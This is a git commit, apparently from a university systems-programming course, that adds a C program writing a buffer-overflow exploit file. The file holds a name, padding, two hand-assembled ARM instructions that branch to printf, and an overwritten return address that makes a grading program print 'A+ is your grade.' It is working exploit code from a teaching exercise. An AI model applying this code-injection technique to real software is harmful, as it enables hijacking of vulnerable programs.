82faaa285dd4517ab74287495036a535b759dddf
Kok Wei Pua <kp7662@princeton.edu>
2023-05-04 23:25:44 -0400

    try A plus

---
+++ createdataAplus.c
@@ -0,0 +1,46 @@
+#include <stdio.h>
+#include "miniassembler.h"
+
+int main(void) {
+
+    int i; 
+    unsigned long ulAddr;
+    unsigned int uiAdr;
+    unsigned int uiB;
+    
+    FILE *psFile;
+    psFile = fopen("dataAplus", "w");
+
+    /* Write name to file */
+    fprintf(psFile, "Chewei Puaji");
+    putc('\n', psFile);
+
+    /* Write gradeStr to file */
+    fprintf(psFile, "A+ is your grade.");
+
+    for (i = 0; i < 2; i++) {
+        putc('\0', psFile);
+    }
+
+    /*  addr x0, &gradeStr */    
+    uiAdr = MiniAssembler_adr(0, 0x420065, 0x420078);
+    fwrite(&uiAdr, sizeof(unsigned int), 1, psFile);
+
+    /* b printf */
+    uiB = MiniAssembler_b(0x400878, 0x42007C); 
+    fwrite(&uiB, sizeof(unsigned int), 1, psFile);
+
+    /* Fill in null bytes to reach the end of buf array */
+    for (i = 0; i < 8; i++) {
+        putc('\0', psFile);
+    }
+
+    /* Write the return address */ 
+    ulAddr = 0x420078;
+    fwrite(&ulAddr, sizeof(unsigned long), 1, psFile);
+
+    /* Close the file and return 0 */
+    fclose(psFile); 
+    return 0; 
+
+}
